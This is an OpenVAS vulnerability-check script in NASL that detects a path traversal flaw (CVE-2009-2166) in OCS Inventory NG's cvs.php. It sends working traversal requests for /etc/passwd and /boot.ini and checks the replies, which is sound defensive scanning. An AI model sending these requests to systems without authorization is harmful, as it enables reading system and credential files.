###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ocs_inventory_ng_info_disc_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# OCS Inventory NG 'cvs.php' Inforamtion Disclosure Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause path traversal attack,
  and gain sensitive information.
  Impact Level: System";
tag_affected = "OCS Inventory NG version prior to 1.02.1";
tag_insight = "The flaw is due to improper sanitization of user supplied input through the
  'cvs.php' file which can exploited by sending a direct request to the
  'log' parameter.";
tag_solution = "Upgrade to OCS Inventory NG version 1.02.1 or later
  http://www.ocsinventory-ng.org/index.php?page=downloads";
tag_summary = "This host is running OCS Inventory NG and is prone to Information
  Disclosure vulnerability.";

if(description)
{
  script_id(900378);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-06-26 07:55:21 +0200 (Fri, 26 Jun 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2009-2166");
  script_name("OCS Inventory NG 'cvs.php' Inforamtion Disclosure Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/8868");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/50946");

  script_description(desc);
  script_summary("Check for the Attack of OCS Inventory NG");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

ocsngPort = get_http_port(default:80);
if(!ocsngPort){
  ocsngPort = 80;
}

if(!get_port_state(ocsngPort)){
  exit(0);
}

foreach dir (make_list("/ocsreports", "/", cgi_dirs()))
{
  sndReq = http_get(item:dir + "/index.php", port:ocsngPort);
  rcvRes = http_send_recv(port:ocsngPort, data:sndReq);
  if("OCS Inventory" >< rcvRes)
  {
    if(!safe_checks())
    {
      sndReq1 = http_get(item:dir + "/cvs.php?log=/etc/passwd",
                         port:ocsngPort);
      rcvRes1 = http_send_recv(port:ocsngPort, data:sndReq1);
      if("root" >< rcvRes1)
      {
        security_warning(ocsngPort);
        exit(0);
      }

      sndReq2 = http_get(item:dir + "/cvs.php?log=/boot.ini",
                         port:ocsngPort);
      rcvRes2 = http_send_recv(port:ocsngPort, data:sndReq2);
      if("boot loader" >< rcvRes2)
      {
        security_warning(ocsngPort);
        exit(0);
      }
    }
  }
}
